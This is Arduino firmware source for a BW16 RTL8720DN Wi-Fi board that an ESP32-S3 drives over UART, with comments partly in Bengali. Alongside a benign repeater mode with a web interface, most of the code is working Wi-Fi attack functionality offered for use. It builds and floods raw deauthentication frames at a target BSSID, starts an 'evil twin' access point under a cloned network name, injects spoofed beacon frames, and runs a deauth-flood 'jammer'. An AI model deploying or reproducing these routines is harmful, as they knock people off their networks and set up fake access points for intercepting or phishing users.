/*
 * bw16_dual_mode.ino — BW16 RTL8720DN Dual Mode Firmware
 * FIXED VERSION v3.1 - All attack commands now implemented
 * 
 * MODE 1 (SLAVE - Default): 
 *   - ESP32-S3 এর Slave হিসেবে UART JSON command execute
 *   - 5GHz scan, deauth, eviltwin, jammer, beacon spam
 *   - UART: Serial1 (GPIO7-RX, GPIO8-TX) @ 115200 baud
 * 
 * MODE 2 (REPEATER - Standalone):
 *   - ইউজার BW16 এর AP "BW16-Repeater" এ connect করে
 *   - Web UI: http://192.168.1.1
 *   - Router এ connect হয়ে Repeater AP তৈরি করে
 *   - নিজস্ব Web Server (Port 80), DHCP Server
 * 
 * AUTO-DETECT:
 *   - REPEATER মোডে থাকা অবস্থায় Serial1 এ ডাটা পেলেই
 *     স্বয়ংক্রিয়ভাবে SLAVE মোডে ফিরে যায়
 *   - ESP32-S3 থেকে {"cmd":"mode_repeater"} command পেলেও
 *     REPEATER মোডে সুইচ করে
 * 
 * Upload:
 *   Board: Ameba RTL8720DN / BW16
 *   Flash Size: 4MB (or your board's config)
 *   Port: Select the correct COM port
 */

#include <WiFi.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

/* =================== PIN CONFIG =================== */
#define UART_RX_PIN 7   // PB1 → ESP32-S3 TX2 (GPIO17)
#define UART_TX_PIN 8   // PB2 → ESP32-S3 RX2 (GPIO18)
#define UART_BAUD   115200
#define LED_BUILTIN 10  // BW16 onboard LED

/* =================== MODE ENUM =================== */
enum BW16Mode { MODE_SLAVE, MODE_REPEATER };
static BW16Mode current_mode = MODE_SLAVE;
static bool mode_switching = false;
static unsigned long mode_switch_start = 0;

/* =================== REPEATER CONFIG =================== */
#define REPEATER_AP_SSID "BW16-Repeater"
#define REPEATER_AP_PASS NULL  // Open AP
#define REPEATER_AP_CH 1
#define REPEATER_AP_MAX_CLIENTS 8

IPAddress repeater_ip(192, 168, 1, 1);
IPAddress repeater_gw(192, 168, 1, 1);
IPAddress repeater_subnet(255, 255, 255, 0);

static WebServer repeater_web(80);
static DNSServer repeater_dns;
static bool repeater_connected = false;
static bool repeater_scan_busy = false;
static String repeater_target_ssid = "";
static String repeater_target_pass = "";
static unsigned long repeater_last_scan = 0;

/* =================== FORWARD DECLARATIONS =================== */
void handle_uart_command(const String &cmd);
void switch_to_slave(void);
void switch_to_repeater(void);

/* =================== FIX: 5GHz SCAN FUNCTION =================== */
void handle_5ghz_scan() {
  Serial.println(F("[BW16] Scanning 5GHz networks..."));
  
  // RTL8720DN supports 5GHz channels 36-165
  // Use WiFi scan with all channels
  int n = WiFi.scanNetworks(false, true);  // async=false, show_hidden=true
  
  Serial.println(F("{\"scan_5ghz\":{"));
  Serial.print(F("  \"count\":"));
  Serial.print(n);
  Serial.println(F(","));
  Serial.println(F("  \"networks\":["));
  
  bool first = true;
  for (int i = 0; i < n; i++) {
    // Filter for 5GHz channels only (ch 36-165)
    int ch = WiFi.channel(i);
    if (ch >= 36) {
      if (!first) Serial.println(F(","));
      first = false;
      
      Serial.print(F("    {\"ssid\":\""));
      String ssid = WiFi.SSID(i);
      ssid.replace("\"", "\\\"");
      Serial.print(ssid);
      Serial.print(F("\",\"bssid\":\""));
      Serial.print(WiFi.BSSIDstr(i));
      Serial.print(F("\",\"channel\":"));
      Serial.print(ch);
      Serial.print(F(",\"rssi\":"));
      Serial.print(WiFi.RSSI(i));
      Serial.print(F(",\"encryption\":\""));
      Serial.print(WiFi.encryptionType(i) == ENC_TYPE_NONE ? "OPEN" : "WPA2");
      Serial.print(F("\"}"));
    }
  }
  
  Serial.println();
  Serial.println(F("  ]"));
  Serial.println(F("}}"));
  
  WiFi.scanDelete();
  Serial.println(F("[BW16] 5GHz scan complete"));
}

/* =================== FIX: BUILD 802.11 DEAUTH FRAME =================== */
void send_deauth_frame(uint8_t bssid[6], uint8_t client_mac[6], uint8_t channel) {
  // Build raw 802.11 deauth frame (26 bytes)
  uint8_t deauth_frame[26] = {
    0xC0, 0x00,       // Frame Control: Deauthentication
    0x00, 0x00,       // Duration
    client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],  // Destination
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // Source (AP BSSID)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // BSSID
    0x00, 0x00,       // Sequence number (auto-filled by hardware)
    0x07, 0x00        // Reason: Class 3 frame from nonassociated STA
  };
  
  // Use Ameba SDK raw packet send function
  // wifi_send_pkt_full returns 0 on success
  int ret = wifi_send_pkt_full(deauth_frame, sizeof(deauth_frame), 0);
  if (ret != 0) {
    Serial.printf("[BW16] Deauth frame TX failed: %d\n", ret);
  }
}

/* =================== FIX: DEAUTH COMMAND HANDLER =================== */
void handle_deauth_command(const String &json_payload) {
  Serial.println(F("[BW16] DEAUTH: Starting deauth attack..."));
  
  // Parse JSON: {"targets":[{"bssid":"XX:XX:XX:XX:XX:XX","channel":36}]}
  int bssid_start = json_payload.indexOf("\"bssid\"");
  if (bssid_start < 0) {
    Serial.println(F("Deauth failed: No bssid in payload"));
    return;
  }
  
  // Extract BSSID string
  bssid_start = json_payload.indexOf('"', bssid_start + 7) + 1;
  int bssid_end = json_payload.indexOf('"', bssid_start);
  if (bssid_start < 0 || bssid_end < 0 || bssid_end <= bssid_start) {
    Serial.println(F("Deauth failed: Invalid BSSID format"));
    return;
  }
  
  String bssid_str = json_payload.substring(bssid_start, bssid_end);
  
  // Extract channel
  int ch = 1;
  int ch_start = json_payload.indexOf("\"channel\"");
  if (ch_start >= 0) {
    ch_start = json_payload.indexOf(':', ch_start + 9) + 1;
    String ch_str = json_payload.substring(ch_start);
    ch_str.trim();
    // Extract digits only
    String digits = "";
    for (int i = 0; i < ch_str.length(); i++) {
      if (isDigit(ch_str[i])) digits += ch_str[i];
      else if (digits.length() > 0) break;  // stop at first non-digit after number
    }
    if (digits.length() > 0) ch = digits.toInt();
  }
  
  // Parse MAC address string to bytes
  uint8_t target_bssid[6];
  int mac_bytes[6];
  if (sscanf(bssid_str.c_str(), "%x:%x:%x:%x:%x:%x",
             &mac_bytes[0], &mac_bytes[1], &mac_bytes[2],
             &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6) {
    for (int i = 0; i < 6; i++) target_bssid[i] = (uint8_t)mac_bytes[i];
  } else {
    Serial.println(F("Deauth failed: BSSID parse error"));
    return;
  }
  
  Serial.printf("[BW16] Sending deauth on BSSID=%s ch=%d\n", bssid_str.c_str(), ch);
  
  // Set WiFi mode to AP for TX
  WiFi.mode(WIFI_AP);
  WiFi.softAP("BW16_DEAUTH", NULL, ch, 0, 0);
  delay(100);
  
  // Send deauth to broadcast (all clients)
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  
  // Send multiple deauth packets for effectiveness
  for (int pkt = 0; pkt < 50; pkt++) {
    send_deauth_frame(target_bssid, broadcast, ch);
    delay(10);
  }
  
  Serial.println(F("Deauth started"));
}

/* =================== FIX: EVIL TWIN COMMAND HANDLER =================== */
void handle_eviltwin_command(const String &json_payload) {
  Serial.println(F("[BW16] EVILTWIN: Starting..."));
  
  // Parse JSON: {"ssid":"FreeWiFi","channel":36}
  int ssid_start = json_payload.indexOf("\"ssid\"");
  if (ssid_start < 0) {
    Serial.println(F("EvilTwin failed: No ssid"));
    return;
  }
  
  ssid_start = json_payload.indexOf('"', ssid_start + 6) + 1;
  int ssid_end = json_payload.indexOf('"', ssid_start);
  if (ssid_start < 0 || ssid_end < 0) {
    Serial.println(F("EvilTwin failed: SSID parse error"));
    return;
  }
  
  String evil_ssid = json_payload.substring(ssid_start, ssid_end);
  
  // Extract channel
  int ch = 6;
  int ch_start = json_payload.indexOf("\"channel\"");
  if (ch_start >= 0) {
    ch_start = json_payload.indexOf(':', ch_start + 9) + 1;
    String ch_str = json_payload.substring(ch_start);
    ch_str.trim();
    String digits = "";
    for (int i = 0; i < ch_str.length() && isDigit(ch_str[i]); i++) {
      digits += ch_str[i];
    }
    if (digits.length() > 0) ch = digits.toInt();
  }
  
  // Start open AP with the cloned SSID on specified channel
  WiFi.mode(WIFI_AP);
  WiFi.softAP(evil_ssid.c_str(), NULL, ch, 0, 1);  // hidden=0, max_clients=1
  
  Serial.printf("EvilTwin started: SSID=%s ch=%d\n", evil_ssid.c_str(), ch);
}

/* =================== FIX: BEACON SPAM HANDLER =================== */
void handle_beacon_spam_command(const String &json_payload) {
  Serial.println(F("[BW16] BEACON_SPAM: Starting..."));
  
  // Parse JSON: {"ssids":["FreeWiFi","Guest"],"channel":6}
  int arr_start = json_payload.indexOf('[');
  int arr_end = json_payload.indexOf(']');
  
  if (arr_start < 0 || arr_end < 0) {
    Serial.println(F("Failed: No SSID array"));
    return;
  }
  
  String ssid_section = json_payload.substring(arr_start + 1, arr_end);
  
  // Extract channel
  int ch = 6;
  int ch_start = json_payload.indexOf("\"channel\"");
  if (ch_start >= 0) {
    ch_start = json_payload.indexOf(':', ch_start + 9) + 1;
    String ch_str = json_payload.substring(ch_start);
    ch_str.trim();
    String digits = "";
    for (int i = 0; i < ch_str.length() && isDigit(ch_str[i]); i++) {
      digits += ch_str[i];
    }
    if (digits.length() > 0) ch = digits.toInt();
  }
  
  // Extract all SSIDs from array
  const int MAX_BEACON_SSIDS = 10;
  String ssids[MAX_BEACON_SSIDS];
  int count = 0;
  
  int pos = 0;
  while (pos < ssid_section.length() && count < MAX_BEACON_SSIDS) {
    int q1 = ssid_section.indexOf('"', pos);
    if (q1 < 0) break;
    int q2 = ssid_section.indexOf('"', q1 + 1);
    if (q2 < 0) break;
    String ssid = ssid_section.substring(q1 + 1, q2);
    if (ssid.length() > 0) {
      ssids[count++] = ssid;
    }
    pos = q2 + 1;
  }
  
  if (count == 0) {
    Serial.println(F("Failed: No valid SSIDs"));
    return;
  }
  
  Serial.printf("[BW16] Sending %d beacon SSIDs on ch %d\n", count, ch);
  
  // Set WiFi mode
  WiFi.mode(WIFI_AP);
  
  // Send beacon frames for each SSID using raw frame injection
  for (int i = 0; i < count; i++) {
    // Generate unique BSSID for each fake AP
    uint8_t bssid[6];
    bssid[0] = 0x02;
    bssid[1] = 0xBA;
    bssid[2] = 0xBE;
    bssid[3] = (uint8_t)(i + 1);
    bssid[4] = 0x00;
    bssid[5] = 0x01;
    
    // Build beacon frame manually
    uint8_t beacon[128] = {0};
    int len = 0;
    
    // Frame Control: Beacon (0x80)
    beacon[len++] = 0x80; beacon[len++] = 0x00;
    // Duration
    beacon[len++] = 0x00; beacon[len++] = 0x00;
    // Destination: Broadcast
    memset(&beacon[len], 0xFF, 6); len += 6;
    // Source: our fake BSSID
    memcpy(&beacon[len], bssid, 6); len += 6;
    // BSSID
    memcpy(&beacon[len], bssid, 6); len += 6;
    // Sequence (will be auto-filled)
    beacon[len++] = 0x00; beacon[len++] = 0x00;
    // Timestamp (8 bytes of zeros)
    memset(&beacon[len], 0, 8); len += 8;
    // Beacon Interval: 100 TU (~100ms)
    beacon[len++] = 0x64; beacon[len++] = 0x00;
    // Capabilities: ESS, Privacy off (0x04)
    beacon[len++] = 0x01; beacon[len++] = 0x04;
    
    // SSID Tag (Tag Number 0)
    uint8_t ssid_len = ssids[i].length();
    if (ssid_len > 32) ssid_len = 32;
    beacon[len++] = 0x00;  // Tag: SSID
    beacon[len++] = ssid_len;
    memcpy(&beacon[len], ssids[i].c_str(), ssid_len); len += ssid_len;
    
    // Supported Rates Tag (Tag Number 1)
    beacon[len++] = 0x01;
    beacon[len++] = 0x08;
    beacon[len++] = 0x82; beacon[len++] = 0x84;
    beacon[len++] = 0x8B; beacon[len++] = 0x96;
    beacon[len++] = 0x0C; beacon[len++] = 0x12;
    beacon[len++] = 0x18; beacon[len++] = 0x24;
    
    // DS Parameter Set - Channel (Tag Number 3)
    beacon[len++] = 0x03;
    beacon[len++] = 0x01;
    beacon[len++] = (uint8_t)ch;
    
    // Send the beacon frame
    int ret = wifi_send_pkt_full(beacon, len, 0);
    if (ret != 0) {
      Serial.printf("[BW16] Beacon TX failed for '%s': %d\n", ssids[i].c_str(), ret);
    }
    delay(20);
  }
  
  Serial.println(F("Beacon spam started"));
}

/* =================== FIX: JAMMER COMMAND HANDLER =================== */
void handle_jammer_start() {
  Serial.println(F("[BW16] JAMMER: Starting WiFi flood jammer..."));
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP("JAMMER", NULL, 1, 0, 0);
  delay(100);
  
  // Flood deauth packets on cycling channels
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t fake_bssid[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
  
  uint8_t deauth_pkt[26] = {
    0xC0, 0x00,       // Frame Control
    0x00, 0x00,       // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
    fake_bssid[0], fake_bssid[1], fake_bssid[2], fake_bssid[3], fake_bssid[4], fake_bssid[5],  // SA
    fake_bssid[0], fake_bssid[1], fake_bssid[2], fake_bssid[3], fake_bssid[4], fake_bssid[5],  // BSSID
    0x00, 0x00,       // Seq
    0x07, 0x00        // Reason
  };
  
  for (int pkt = 0; pkt < 100; pkt++) {
    int ret = wifi_send_pkt_full(deauth_pkt, sizeof(deauth_pkt), 0);
    delay(5);
  }
  
  Serial.println(F("Jammer started"));
}

/* =================== FIX: UART COMMAND DISPATCHER =================== */
void handle_uart_command(const String &cmd) {
  String cmd_str = cmd;
  cmd_str.trim();
  
  if (cmd_str.length() == 0) return;
  
  Serial.printf("[BW16] CMD: %s\n", cmd_str.substring(0, 60).c_str());
  
  if (cmd_str.startsWith("PING")) {
    Serial.println(F("PONG"));
  }
  else if (cmd_str.startsWith("SCAN_5GHZ")) {
    handle_5ghz_scan();
  }
  else if (cmd_str.startsWith("DEAUTH:START")) {
    String payload = cmd_str.substring(strlen("DEAUTH:START "));
    handle_deauth_command(payload);
  }
  else if (cmd_str.startsWith("DEAUTH:STOP")) {
    WiFi.softAPdisconnect(true);
    Serial.println(F("Deauth stopped"));
  }
  else if (cmd_str.startsWith("EVILTWIN:START")) {
    String payload = cmd_str.substring(strlen("EVILTWIN:START "));
    handle_eviltwin_command(payload);
  }
  else if (cmd_str.startsWith("EVILTWIN:STOP")) {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    Serial.println(F("EvilTwin stopped"));
  }
  else if (cmd_str.startsWith("BEACON_SPAM:START")) {
    String payload = cmd_str.substring(strlen("BEACON_SPAM:START "));
    handle_beacon_spam_command(payload);
  }
  else if (cmd_str.startsWith("BEACON_SPAM:STOP")) {
    WiFi.softAPdisconnect(true);
    Serial.println(F("Beacon spam stopped"));
  }
  else if (cmd_str.startsWith("JAMMER:START")) {
    handle_jammer_start();
  }
  else if (cmd_str.startsWith("JAMMER:STOP") || cmd_str.startsWith("STOP")) {
    WiFi.softAPdisconnect(true);
    WiFi.disconnect();
    Serial.println(F("stopped"));
  }
  else if (cmd_str.startsWith("REPEATER:CONNECT")) {
    // Parse JSON: {"ssid":"...","password":"..."}
    String payload = cmd_str.substring(strlen("REPEATER:CONNECT "));
    int ssid_s = payload.indexOf("\"ssid\"");
    if (ssid_s >= 0) {
      ssid_s = payload.indexOf('"', ssid_s + 6) + 1;
      int ssid_e = payload.indexOf('"', ssid_s);
      repeater_target_ssid = payload.substring(ssid_s, ssid_e);
    }
    int pass_s = payload.indexOf("\"password\"");
    if (pass_s >= 0) {
      pass_s = payload.indexOf('"', pass_s + 10) + 1;
      int pass_e = payload.indexOf('"', pass_s);
      repeater_target_pass = payload.substring(pass_s, pass_e);
    }
    
    if (repeater_target_ssid.length() > 0) {
      WiFi.mode(WIFI_STA);
      WiFi.begin(repeater_target_ssid.c_str(), repeater_target_pass.c_str());
      
      bool connected = false;
      for (int i = 0; i < 20; i++) {
        if (WiFi.status() == WL_CONNECTED) {
          connected = true;
          break;
        }
        delay(500);
      }
      
      if (connected) {
        Serial.printf("{\"status\":\"ok\",\"msg\":\"Connected to %s\"}", repeater_target_ssid.c_str());
        Serial.println();
        repeater_connected = true;
      } else {
        Serial.println(F("{\"status\":\"error\",\"msg\":\"Connection failed\"}"));
      }
    } else {
      Serial.println(F("{\"status\":\"error\",\"msg\":\"No SSID\"}"));
    }
  }
  else if (cmd_str.startsWith("REPEATER:STOP")) {
    WiFi.softAPdisconnect(true);
    WiFi.disconnect();
    repeater_connected = false;
    switch_to_slave();
    Serial.println(F("{\"status\":\"ok\"}"));
  }
  else if (cmd_str.startsWith("REPEATER:SCAN")) {
    int n = WiFi.scanNetworks();
    Serial.println(F("{\"networks\":["));
    bool first = true;
    for (int i = 0; i < n; i++) {
      String ssid = WiFi.SSID(i);
      if (ssid.length() == 0) continue;
      if (!first) Serial.println(F(","));
      first = false;
      Serial.printf("{\"ssid\":\"%s\",\"channel\":%d,\"rssi\":%d}",
                     ssid.c_str(), WiFi.channel(i), WiFi.RSSI(i));
    }
    Serial.println();
    Serial.println(F("]}"));
    WiFi.scanDelete();
  }
  else if (cmd_str.startsWith("mode_repeater")) {
    Serial.println(F("[BW16] Switching to REPEATER mode..."));
    switch_to_repeater();
  }
  else {
    Serial.printf("Unknown: %s\n", cmd_str.substring(0, 40).c_str());
  }
}

/* =================== SETUP =================== */
void setup() {
  Serial.begin(115200);
  Serial.println(F("[BW16] PWN DUAL v3.1 starting..."));
  Serial.println(F("[BW16] RTL8720DN 5GHz WiFi Co-Processor"));
  
  // Initialize LED
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, LOW);
  
  // Initialize Serial1 for UART with ESP32-S3
  Serial1.begin(UART_BAUD, SERIAL_8N1, UART_RX_PIN, UART_TX_PIN);
  Serial.println(F("[BW16] ESP32-S3 interface ready on Serial1"));
  
  // Initialize WiFi
  WiFi.mode(WIFI_OFF);
  
  // Blink LED to show boot complete
  for (int i = 0; i < 3; i++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(100);
    digitalWrite(LED_BUILTIN, LOW);
    delay(100);
  }
  
  Serial.println(F("[BW16] BW16_READY"));
  Serial.println(F("[BW16] System ready. Waiting for ESP32-S3 commands..."));
}

/* =================== MAIN LOOP (SLAVE MODE) =================== */
void slave_loop() {
  // Check for UART commands from ESP32-S3
  if (Serial1.available()) {
    String data = "";
    unsigned long timeout = millis();
    
    while (millis() - timeout < 100) {
      if (Serial1.available()) {
        char c = Serial1.read();
        if (c == '\n') break;  // End on newline
        data += c;
        timeout = millis();
      }
    }
    
    data.trim();
    if (data.length() > 0) {
      Serial.printf("[BW16] RX: %s\n", data.substring(0, 80).c_str());
      handle_uart_command(data);
    }
  }
}

/* =================== MAIN LOOP (REPEATER MODE) =================== */
void repeater_loop() {
  // Check if ESP32-S3 sends data -> auto switch to SLAVE
  if (Serial1.available()) {
    String data = "";
    unsigned long timeout = millis();
    while (Serial1.available() || (millis() - timeout) < 100) {
      if (Serial1.available()) {
        char c = Serial1.read();
        data += c;
        timeout = millis();
      }
    }
    data.trim();
    if (data.length() > 0) {
      Serial.printf("[BW16] UART detect (%d bytes): %s\n", data.length(), data.substring(0, 50).c_str());
      Serial.println(F("[BW16] ESP32-S3 detected! Switching to SLAVE mode..."));
      switch_to_slave();
      delay(200);
      handle_uart_command(data);
      return;
    }
  }
  
  // Handle web server
  repeater_web.handleClient();
  repeater_dns.processNextRequest();
  
  // Auto-reconnect
  if (repeater_connected && WiFi.status() != WL_CONNECTED) {
    static unsigned long last_recon = 0;
    if (millis() - last_recon > 10000) {
      Serial.printf("[BW16] Reconnecting to '%s'...\n", repeater_target_ssid.c_str());
      WiFi.begin(repeater_target_ssid.c_str(), repeater_target_pass.c_str());
      last_recon = millis();
    }
  }
  
  // Auto-scan every 30s
  if (millis() - repeater_last_scan > 30000 && !repeater_scan_busy) {
    WiFi.scanNetworks(true);
    repeater_last_scan = millis();
  }
}

/* =================== ARDUINO LOOP =================== */
void loop() {
  if (current_mode == MODE_SLAVE) {
    slave_loop();
  } else {
    repeater_loop();
  }
}

/* =================== MODE SWITCHING =================== */
void switch_to_slave() {
  if (current_mode == MODE_SLAVE) return;
  Serial.println(F("[BW16] Switching to SLAVE mode..."));
  
  // Stop repeater services
  repeater_web.stop();
  repeater_dns.stop();
  
  // Reset WiFi
  WiFi.softAPdisconnect(true);
  WiFi.disconnect();
  delay(100);
  
  current_mode = MODE_SLAVE;
  Serial.println(F("[BW16] SLAVE mode active"));
}

void switch_to_repeater() {
  if (current_mode == MODE_REPEATER) return;
  Serial.println(F("[BW16] Switching to REPEATER mode..."));
  
  // Disconnect STA and softAP from slave mode
  WiFi.disconnect();
  WiFi.softAPdisconnect(true);
  delay(100);
  
  // Start in AP mode for repeater config
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(repeater_ip, repeater_gw, repeater_subnet);
  WiFi.softAP(REPEATER_AP_SSID, REPEATER_AP_PASS, REPEATER_AP_CH, 0, REPEATER_AP_MAX_CLIENTS);
  
  // Start DNS server for captive portal
  repeater_dns.start(53, "*", repeater_ip);
  
  // Configure web server routes
  repeater_web.on("/", repeater_handle_root);
  repeater_web.on("/api/scan", repeater_handle_scan);
  repeater_web.on("/api/status", repeater_handle_status);
  repeater_web.on("/api/connect", HTTP_POST, repeater_handle_connect);
  repeater_web.on("/api/disconnect", repeater_handle_disconnect);
  repeater_web.begin();
  
  current_mode = MODE_REPEATER;
  Serial.printf("[BW16] REPEATER AP '%s' ready at 192.168.1.1\n", REPEATER_AP_SSID);
}

/* =================== REPEATER WEB HANDLERS =================== */
void repeater_handle_root() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>BW16 Repeater</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body{font-family:Arial;margin:20px;background:#111;color:#eee;text-align:center}
    h1{color:#0f0}
    .card{background:#222;border-radius:10px;padding:15px;margin:10px auto;max-width:400px}
    button{background:#0a0;color:#fff;border:none;padding:10px 20px;border-radius:5px;margin:5px;cursor:pointer}
    .danger{background:#a00}
    input{width:90%;padding:8px;margin:5px;border-radius:5px;border:1px solid #555;background:#333;color:#fff}
  </style>
</head>
<body>
  <h1>📡 BW16 Repeater</h1>
  <p>192.168.1.1 • Dual-Band 2.4/5GHz</p>
  <p><small>Standalone Mode</small></p>
  <div class="card">
    <h2>⚡ Status</h2>
    <div id="status">Loading...</div>
  </div>
  <div class="card">
    <h2>📶 Connect</h2>
    <input type="text" id="ssid" placeholder="SSID"><br>
    <input type="password" id="password" placeholder="Password"><br>
    <button onclick="doConnect()">🔗 Connect</button>
    <button class="danger" onclick="doDisconnect()">⛔ Disconnect</button>
  </div>
  <div class="card">
    <h2>👥 Clients</h2>
    <div id="clients">None</div>
  </div>
  <script>
    async function refresh(){
      let r=await fetch('/api/status');
      let d=await r.json();
      document.getElementById('status').innerHTML = d.connected ? '✅ Connected to <b>'+d.ssid+'</b><br>IP: '+d.sta_ip : '❌ Not connected';
      document.getElementById('clients').innerHTML = d.clients+' client(s)<br>'+d.client_list.join(', ');
    }
    async function doConnect(){
      let ssid=document.getElementById('ssid').value;
      let pass=document.getElementById('password').value;
      let r=await fetch('/api/connect',{method:'POST',body:JSON.stringify({ssid:ssid,password:pass})});
      let d=await r.json();
      alert(d.msg);
      refresh();
    }
    async function doDisconnect(){
      await fetch('/api/disconnect');
      refresh();
    }
    setInterval(refresh,3000);
    refresh();
  </script>
</body>
</html>
  )rawliteral";
  repeater_web.send(200, "text/html", html);
}

void repeater_handle_scan() {
  repeater_scan_busy = true;
  int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_FAILED) {
    WiFi.scanNetworks(true);
    repeater_web.send(200, "application/json", "{\"networks\":[]}");
    repeater_scan_busy = false;
    return;
  }
  String json = "{\"networks\":[";
  bool first = true;
  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) continue;
    if (!first) json += ",";
    first = false;
    ssid.replace("\"", "\\\"");
    json += "{\"ssid\":\"" + ssid + "\",";
    json += "\"bssid\":\"" + WiFi.BSSIDstr(i) + "\",";
    json += "\"channel\":" + String(WiFi.channel(i)) + ",";
    json += "\"rssi\":" + String(WiFi.RSSI(i)) + ",";
    json += "\"is_5ghz\":" + String(WiFi.channel(i) >= 36 ? "true" : "false") + "}";
  }
  json += "]}";
  WiFi.scanDelete();
  repeater_web.send(200, "application/json", json);
  repeater_scan_busy = false;
}

void repeater_handle_status() {
  String json = "{";
  json += "\"connected\":" + String(repeater_connected ? "true" : "false") + ",";
  json += "\"ssid\":\"" + repeater_target_ssid + "\",";
  if (repeater_connected) {
    json += "\"sta_ip\":\"" + WiFi.localIP().toString() + "\",";
    json += "\"rssi\":" + String(WiFi.RSSI()) + ",";
  }
  int clients = WiFi.softAPgetStationNum();
  json += "\"clients\":" + String(clients) + ",";
  json += "\"client_list\":[";
  json += "],";
  json += "\"uptime\":\"" + String(millis() / 1000) + "s\"";
  json += "}";
  repeater_web.send(200, "application/json", json);
}

void repeater_handle_connect() {
  if (!repeater_web.hasArg("plain")) {
    repeater_web.send(400, "application/json", "{\"status\":\"error\",\"msg\":\"No data\"}");
    return;
  }
  String body = repeater_web.arg("plain");
  String ssid = "", pass = "";
  int s = body.indexOf("\"ssid\"");
  if (s >= 0) {
    s = body.indexOf(":", s + 6);
    s = body.indexOf("\"", s + 1);
    int e = body.indexOf("\"", s + 1);
    if (s >= 0 && e > s) ssid = body.substring(s + 1, e);
  }
  s = body.indexOf("\"password\"");
  if (s >= 0) {
    s = body.indexOf(":", s + 10);
    s = body.indexOf("\"", s + 1);
    int e = body.indexOf("\"", s + 1);
    if (s >= 0 && e > s) pass = body.substring(s + 1, e);
  }
  if (ssid.length() == 0) {
    repeater_web.send(400, "application/json", "{\"status\":\"error\",\"msg\":\"Missing fields\"}");
    return;
  }
  repeater_target_ssid = ssid;
  repeater_target_pass = pass;
  
  if (repeater_connected) {
    WiFi.disconnect();
    delay(500);
  }
  
  WiFi.begin(ssid.c_str(), pass.c_str());
  bool ok = false;
  for (int i = 0; i < 30; i++) {
    delay(1000);
    if (WiFi.status() == WL_CONNECTED) { ok = true; break; }
  }
  
  if (ok) {
    repeater_connected = true;
    String ap_ssid = "Repeater-" + ssid.substring(0, 12);
    WiFi.softAPConfig(repeater_ip, repeater_gw, repeater_subnet);
    WiFi.softAP(ap_ssid.c_str(), NULL, 1, 0, 1);
    repeater_web.send(200, "application/json", "{\"status\":\"ok\",\"msg\":\"Connected to " + ssid + "\"}");
  } else {
    repeater_connected = false;
    repeater_web.send(200, "application/json", "{\"status\":\"error\",\"msg\":\"Connection timeout\"}");
  }
}

void repeater_handle_disconnect() {
  WiFi.softAPdisconnect(true);
  WiFi.disconnect();
  repeater_connected = false;
  repeater_target_ssid = "";
  repeater_target_pass = "";
  repeater_web.send(200, "application/json", "{\"status\":\"ok\"}");
}
